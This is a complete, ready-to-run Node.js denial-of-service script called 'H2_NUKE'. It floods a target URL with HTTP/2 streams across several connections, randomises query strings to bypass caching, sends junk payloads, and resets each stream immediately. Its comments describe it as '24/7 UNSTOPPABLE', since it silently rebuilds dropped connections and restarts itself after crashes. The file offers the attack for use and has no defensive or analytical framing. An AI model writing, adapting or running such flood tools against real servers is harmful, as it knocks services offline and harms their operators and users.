const http2 = require('http2');

class H2_NUKE {
    constructor(target) {
        this.target = target;
        this.host = target.replace('https://', '').replace('http://', '').split('/')[0];
        this.running = true;
        this.reqs = 0;
        
        // NUKE SETTINGS
        this.conns = 5;
        this.streamsPerConn = 200; // MAX STREAMS
        this.delay = 5; // 5ms = 200 RPS per connection
        
        console.log('STARTED');
        
        // FORCE GC EVERY 30s
        if (global.gc) {
            setInterval(() => { try { global.gc(); } catch(e) {} }, 30000);
        }
        
        // NUKE ENGINE
        this.nukeEngine();
        
        // AUTO-RESTART EVERY 90s
        this.restartTimer = setInterval(() => {
            this.softRestart();
        }, 90000);
    }
    
    nukeEngine() {
        // CREATE MAX CONNECTIONS
        this.connections = [];
        for (let i = 0; i < this.conns; i++) {
            this.createNukeConn(i);
        }
        
        // MAX FIRE RATE
        this.fireLoop = () => {
            if (!this.running) return;
            
            // FIRE ALL CONNECTIONS
            this.connections.forEach(conn => {
                if (conn && !conn.destroyed) {
                    // FIRE 200 STREAMS PER LOOP
                    for (let j = 0; j < this.streamsPerConn; j++) {
                        this.nukeRequest(conn);
                        this.reqs++;
                    }
                }
            });
            
            // NEXT BATCH IMMEDIATELY
            setImmediate(this.fireLoop);
        };
        
        // START NUKE LOOP
        setImmediate(this.fireLoop);
    }
    
    createNukeConn(id) {
        try {
            const conn = http2.connect(this.target, {
                maxSessionMemory: 65536, // 64KB
                maxSendHeaderBlockLength: 65536,
                peerMaxConcurrentStreams: 1000,
                settings: {
                    initialWindowSize: 2147483647, // MAX WINDOW
                    maxConcurrentStreams: 1000
                }
            });
            
            conn.setTimeout(0); // NO TIMEOUT
            
            conn.on('error', () => {
                // SILENT DEATH & REBIRTH
                setTimeout(() => this.createNukeConn(id), 100);
            });
            
            this.connections[id] = conn;
        } catch(e) {
            setTimeout(() => this.createNukeConn(id), 500);
        }
    }
    
    nukeRequest(conn) {
        try {
            // MAX HEADERS FOR STRESS
            const req = conn.request({
                ':method': 'GET',
                ':path': '/?' + Math.random().toString(36).substring(7),
                ':authority': this.host,
                'user-agent': 'Mozilla/5.0',
                'accept': '*/*',
                'cache-control': 'no-cache',
                'pragma': 'no-cache'
            });
            
            // SEND PAYLOAD TO STRESS SERVER
            req.write('a'.repeat(1024));
            req.end();
            
            // INSTANT DESTROY - NO WAITING
            req.close();
            
        } catch(e) {
            // IGNORE
        }
    }
    
    softRestart() {
        // ONLY RESTART DEAD CONNECTIONS
        this.connections.forEach((conn, idx) => {
            if (!conn || conn.destroyed) {
                this.createNukeConn(idx);
            }
        });
    }
    
    stop() {
        this.running = false;
        clearInterval(this.restartTimer);
        this.connections.forEach(conn => {
            try { if (conn) conn.destroy(); } catch(e) {}
        });
    }
}

// 24/7 UNSTOPPABLE
process.on('uncaughtException', () => {
    setTimeout(() => {
        if (process.argv[2]) {
            const nuke = new H2_NUKE(process.argv[2]);
        }
    }, 1000);
});

process.on('unhandledRejection', () => {});

// START
if (process.argv[2]) {
    const nuke = new H2_NUKE(process.argv[2]);
    
    process.on('SIGINT', () => {
        nuke.stop();
        process.exit(0);
    });
} else {
    console.log('node nuke.js https://target.com');
           }
